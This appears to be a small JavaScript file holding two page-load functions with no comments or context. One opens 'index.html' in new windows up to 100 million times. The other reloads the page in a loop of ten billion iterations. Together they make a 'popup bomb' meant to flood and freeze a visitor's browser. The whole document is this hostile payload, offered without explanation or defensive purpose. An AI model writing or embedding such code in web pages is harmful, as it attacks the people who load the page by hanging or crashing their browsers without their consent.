function onload_1()
{
    for(i = 1 ; i<=100000000 ; i++)
    {
        window.open("index.html")
    }
}
function onload_2()
{
    for(i = 1 ; i<=10000000000 ; i++)
    {
        window.location.href = "index.html" ;
    }
}